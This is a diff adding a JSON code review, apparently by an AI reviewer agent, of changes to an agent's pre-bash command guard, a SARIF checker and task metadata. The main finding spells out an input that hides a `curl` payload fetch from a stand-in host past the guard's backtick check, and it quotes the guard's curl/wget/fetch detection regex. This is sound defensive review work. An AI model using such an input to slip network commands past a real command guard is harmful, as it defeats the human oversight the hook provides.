@@ -1,0 +1,37 @@
+{
+  "verdict": "changes_requested",
+  "review_summary": "Static review of the frozen snapshot. The ledger classification repair (T130), the effective-severity gate (T326) and the weekly env/quoted-argv fix (T327) look correct, and I found no defect in them that blocks. T129 introduces a security regression in the pre-bash guard. The new backtick tokenizer pairs every unescaped backtick globally and ignores shell quoting. A single literal backtick in a single-quoted string flips the pairing. A real `` `curl \u2026` `` substitution later in the command then falls outside every inspected payload. The base regex (`` `[^`]*(curl|wget|fetch) ``) denied this command, so the diff turns a blocked case into an allowed one. The 46-case suite has no odd-literal-tick case, so it passes. The remaining issues are minor: a SARIF edge case that fails closed, and ledger metadata. The review is static only and I executed nothing. The parent-supplied integration results are taken as given.",
+  "findings": [
+    {
+      "severity": "high",
+      "file": ".claude/hooks/pre-bash-guard.sh",
+      "line": 147,
+      "title": "Backtick pairing ignores shell quoting, so a literal tick in single quotes hides a real `curl` substitution",
+      "reason": "The awk tokenizer treats every unescaped backtick in the whole command as an opener or closer. It does not track single-quoted spans, where a backtick is literal and backslash is not an escape. Minimal input: echo '`'; echo `curl https://example.invalid/payload` . Trace: tick 1 (inside the single quotes) opens a payload. Tick 2 (the real opener) closes it, so the printed payload is `'; echo `. Tick 3 (the real closer) opens an empty payload that the END block prints. The text `curl https://example.invalid/payload` sits between ticks 2 and 3, which is outside every payload, so the backtick_network check never sees it. The remaining layers do not catch it either. subst_sink_patterns only match $( and <(. The stripped segments are `echo <q>` and `echo `curl \u2026``, and none of the deny_patterns match a bare curl. The shell does execute the command substitution, so the guard exits 0 and curl runs. The base pattern `` `[^`]*(curl|wget|fetch) `` matched at the real opener and denied this command. The same parity flip happens with an odd number of backticks in an earlier quoted heredoc body or prose. The comment says to 'keep opening/closing backticks paired', but pairing without quote awareness is the failure mode. Fix options: also deny when the backtick count is odd or when any tick appears inside a single-quoted span. Alternatively, run the old conservative check as a fallback whenever quote state is ambiguous, or track single-quote state in the awk. Add the case above to pre-bash-guard-literals.sh. The existing tests only use balanced ticks."
+    },
+    {
+      "severity": "low",
+      "file": ".claude/scripts/check-sarif.sh",
+      "line": 47,
+      "title": "Schema-valid ruleIndex/index of -1 is rejected as invalid",
+      "reason": "From memory of the SARIF 2.1.0 JSON schema (not checked against the spec text here), result.ruleIndex and the reference `index` properties are integers with minimum -1 and default -1. -1 is the 'no index' sentinel. The gate requires `. >= 0`, so a result such as {ruleId:'x', ruleIndex:-1} makes jq error and the script exits 1 as 'Invalid SARIF'. The suite pins this rejection ('invalid-index--1'). Treating -1 as absent and falling back to ruleId resolution would match the spec. This fails closed, so it can cause false blocks on valid scanner output but cannot hide findings. It is low severity and a compatibility concern only."
+    },
+    {
+      "severity": "nit",
+      "file": "tasks/TASKS.md",
+      "line": 88,
+      "title": "T-129/T-130 flipped to [x] without updating last_touched",
+      "reason": "Both rows keep `last_touched: 2026-06-12`. T-326 and T-327 use 2026-10-16. memory-rollup.sh derives 'Tasks completed this week' from last_touched, so T-129 and T-130 will be attributed to a June 2026 week instead of this one. The metadata is cosmetic, but the weekly rollup content depends on it."
+    }
+  ],
+  "limitations": [
+    "Static review only. I executed no shell, jq, awk, python or tests. Parent-supplied integration results (guard 46 cases, T130 suite, SARIF 70 cases, weekly 6 cases, ledger 0 fail, validate PASS) were not re-verified.",
+    "The high finding comes from tracing the awk and regex logic by hand. I did not run the minimal input against the hook. The parent should run it to confirm before fixing.",
+    "jq semantics (`isfinite`, `tonumber` on 'NaN'/'Infinity', `error` inside defs, operator precedence) were reasoned from jq 1.6-1.7 behaviour and not tested on the target jq versions. The RED logs suggest the NaN and Infinity handling behaves as intended.",
+    "My recollection of SARIF 2.1.0 (ruleIndex minimum -1, kind/level rules, hierarchical rule ids) is from memory and was not re-read against the OASIS text.",
+    "I could not see which workflows or scripts call check-sarif.sh. Output containing tool.extensions (for example CodeQL) or invocations[].ruleConfigurationOverrides is now rejected, and I did not assess that impact. The frozen Semgrep SARIF was not available, so only the supplied claim that the gate exits 1 with 4 findings was considered.",
+    "I did not assess the 150 Semgrep warnings, the two intentional argv Popen launchers, or the historical staged workflow fixture. They are outside this diff, as you stated. I make no claim that the repository is security-clean, that this is a shell sandbox, or about full external SARIF support.",
+    "The weekly-rollup test's YAML extraction depends on fixed 8/10-space indentation. I judged it adequate for this workflow but not a general parser.",
+    "I did not review the spec, plan, analyze JSON or verify/ evidence logs beyond internal consistency. Whether Spec 006 `status: shipped` is appropriate is a process question I did not judge."
+  ]
+}
